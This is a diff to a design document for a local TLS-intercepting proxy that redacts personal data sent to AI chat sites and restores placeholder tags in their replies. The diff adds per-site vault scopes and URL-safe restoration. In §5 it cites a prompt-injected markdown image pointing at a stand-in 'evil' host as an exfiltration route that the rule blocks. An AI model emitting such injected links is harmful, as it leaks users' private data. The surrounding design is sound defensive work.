@@ -16,7 +16,7 @@
 ### In
 - `parda-intercept` crate: CONNECT proxy on `127.0.0.1:8788` (config `intercept.listen`), host policy, TLS termination (rustls) with per-host leaf certificates signed by the parda CA (rcgen, cached in memory), HTTP/1.1 to the client (ALPN offers `http/1.1` only), HTTP/1.1 or h2 to the upstream via reqwest with system/webpki roots.
 - Generic redaction of request bodies to AI hosts: JSON (string leaves, minus identifier-like keys), `application/x-www-form-urlencoded` (values), `text/plain`. Compressed request bodies decoded (gzip/deflate/br/zstd). Multipart file parts and binary bodies: forwarded, counted as unscanned media (warn event); `intercept.unscanned = "allow" | "block"`.
-- Generic restoration of responses: JSON string leaves; SSE (`text/event-stream`) — per event, per JSON path, a `StreamRestorer` so a tag split across deltas restores exactly; NDJSON line streams; `text/plain`. Gemini-style `)]}'` prefixed JSON-in-text handled by restoring raw text with the plain restorer.
+- Generic restoration of responses: JSON string leaves; SSE (`text/event-stream`) — per event, per JSON path, a `StreamRestorer` so a tag split across deltas restores exactly; NDJSON line streams; `text/plain`. Gemini-style `)]}'` prefixed JSON-in-text handled line by line, restoring JSON inside strings at its own level. HTML and other types are not rewritten. *(Updated 2026-10-14 per controller ruling: no `text/html` restore; JSON-safe restore only.)*
 - Site adapters for keys that must never be touched and quirks: chatgpt.com, claude.ai, gemini.google.com, copilot.microsoft.com, perplexity.ai, chat.deepseek.com, chat.mistral.ai, grok.com, meta.ai, poe.com (list in config, user-extensible).
 - WebSocket upgrades to AI hosts: tunnelled without inspection, warn event (Copilot uses WebSockets — documented limitation for v1 of intercept).
 - CA lifecycle: `parda ca create | path | install | uninstall | status`. Key stored 0600 in the data dir (encrypted with the vault key); certificate 10-year validity, name constraints are not used (browsers ignore them on roots inconsistently).
@@ -25,7 +25,7 @@
   - Windows: PAC via `HKCU\…\Internet Settings\AutoConfigURL` + `InternetSetOption` refresh; certificate via `certutil -user -addstore Root` (Windows shows its own confirmation).
   - Linux: GNOME `gsettings` proxy autoconfig URL; certificate instructions (system store requires sudo) — documented, not automated.
   - Firefox: uses its own settings; `parda intercept on` prints the two prefs to set (`network.proxy.autoconfig_url`, `security.enterprise_roots.enabled`).
-- Tags: replacement style `token` with a configurable format; new default token format `[{LABEL}_{N}]` with friendly labels (Person → NAME, Email → EMAIL, Phone → PHONE, Aadhaar → AADHAAR, Pan → PAN, CreditCard → CARD, BankAccount → ACCOUNT, Address → ADDRESS, Upi → UPI, Secret → SECRET …). Restoration accepts the exact tag and case variants. The intercept surface defaults to tags; the agent proxy keeps the global `replace.style`. Config: `replace.style` (global), `intercept.style` (overrides for intercept; default `token`), `replace.token_format`.
+- Tags: replacement style `token`, format `[{LABEL}_{N}]` with friendly labels (Person → NAME, Email → EMAIL, Phone → PHONE, Aadhaar → AADHAAR, Pan → PAN, CreditCard → CARD, BankAccount → ACCOUNT, Address → ADDRESS, Upi → UPI, Secret → SECRET …). Restoration accepts the exact tag and case variants. Every surface, intercept included, uses the global `replace.style` (default `token`). *(Superseded 2026-10-13: an earlier draft had a separate `intercept.style` and a configurable `replace.token_format`; the controller ruled for one global style; the tag format is fixed, as already shipped by parda-vault.)*
 - TUI/CLI: intercept status on the dashboard and Settings tab (on/off, CA trusted?, hosts); events per surface `intercept`.
 
 ### Out (later)
@@ -42,24 +42,26 @@ browser / desktop app ──PAC──► AI host?  no ──► DIRECT (untouche
                                                   CONNECT host:443
                                                   ├─ host not in list → blind TCP tunnel
                                                   └─ host in list → TLS (parda CA leaf)
-                                                        request: decode → redact (engine, scope "chat") → forward (rustls, verified)
+                                                        request: decode → redact (engine, scope intercept:<host>) → forward (rustls, verified)
                                                         response: decode → restore (JSON / SSE per path / text) → client
 ```
 
 - Runs inside the daemon (shares `Engine`, events, config); `intercept.enabled` starts the listener. The PAC endpoint is served by the same listener (plain GET `/parda.pac`).
-- Scope: `intercept.scope` (default `"global"`, same as clipboard) so a name has the same tag in the browser, the clipboard and the CLI.
+- Scope: `intercept.scope` (default `"per-host"`): each listed site gets its own vault scope `intercept:<host>`, so a site's answers can only restore tags issued for text sent to that same site (a restore oracle across sites or surfaces is closed). Any other value is a fixed scope name (`"global"` shares tags with the clipboard and the CLI). *(Updated 2026-10-14 per controller ruling; earlier draft: default `"global"`.)*
 - Fail mode: if parda is not running, the PAC URL is unreachable and the OS falls back to DIRECT — AI sites work unprotected (documented; TUI and `parda status` say whether intercept is active). While parda runs, strict mode refuses a send whose redaction fails (the site shows a network error; parda's event explains).
 
 ## 4. Request redaction rules (generic)
 
-- JSON: walk all string leaves; skip keys matching identifier patterns (`id`, `*_id`, `*Id`, `uuid`, `model`, `token`, `*_token`, `nonce`, `signature`, `timestamp`, `create_time`, `parent`, `parent_message_id`, `conversation_id`, `organization_uuid`, `locale`, `timezone`, `client_*`, `arkose*`, `sentinel*`) and values that look like identifiers (UUIDs, base64 ≥ 40 chars without spaces, URLs to the same host). Site adapters add/override skip keys.
-- Strings that themselves contain JSON (e.g. Gemini `f.req`) are parsed and walked recursively (depth ≤ 4).
+- JSON: walk all string leaves; identifier-shaped values (≤ 64 chars of `[A-Za-z0-9_.:/+=-]`) under keys matching identifier patterns (`id`, `*_id`, `*Id`, `uuid`, `model`, `token`, `*_token`, `nonce`, `signature`, `timestamp`, `create_time`, `parent`, `parent_message_id`, `conversation_id`, `organization_uuid`, `locale`, `timezone`, `client_*`, `arkose*`, `sentinel*`) and identifier-shaped values that look like identifiers (UUIDs, hex ≥ 16, base64 ≥ 32 chars, URLs to a listed host) skip only the ML model: the dictionary and rule tiers still redact an e-mail, phone, ID number or key in them, and anything not identifier-shaped is redacted like text under any key (one engine call per request via `Engine::redact_many_tiered`). Site adapters add skip keys. *(Updated 2026-10-14 per controller ruling: skipping never hides personal data.)*
+- Strings that themselves contain JSON (e.g. Gemini `f.req`) are parsed and walked recursively (depth ≤ 4); beyond that, or when they do not parse, they are redacted as plain text.
 - `application/x-www-form-urlencoded`: decode, redact values with the same rules, re-encode.
 - Content-Length recomputed; `content-encoding` removed after decoding.
 
 ## 5. Response restoration
 
-- Only tags/stand-ins of the scope are touched, so restoring every string is safe.
+- Only tags/stand-ins of the site's own scope are touched (per-host scopes, §3).
+- Never inside URLs: a tag inside `scheme://…` (to whitespace), a markdown link/image target `](…)` / `](<…>)` or reference definition, an `href=`/`src=`/`srcset=`/`action=`/`formaction=`/`poster=`/`background=`/`data=` value, or CSS `url(…)` stays a tag, so a prompt-injected `![x](https://evil/?d=[NAME_1])` cannot exfiltrate the value. Applied to JSON leaves, SSE (state kept across chunks and events) and plain text.
+- JSON-safe: real values land only inside parsed JSON strings (re-serialised), JSON-escaped in streamed JSON fragments (`partial_json`, `arguments`), or in plain text; JSON inside strings is restored at its own level; a body or NDJSON line that is not valid JSON passes through unrestored.
 - SSE: events parsed incrementally; for each `data:` payload that is JSON, string leaves are restored with a `StreamRestorer` keyed by the event's JSON path (plus the `p` path field of chatgpt.com delta-encoding when present); non-JSON data lines use one restorer per stream. Flush on stream end.
 - `accept-encoding: identity` is forced upstream for AI hosts so responses can be rewritten; responses are streamed (no full buffering) except JSON ≤ 16 MiB.
 
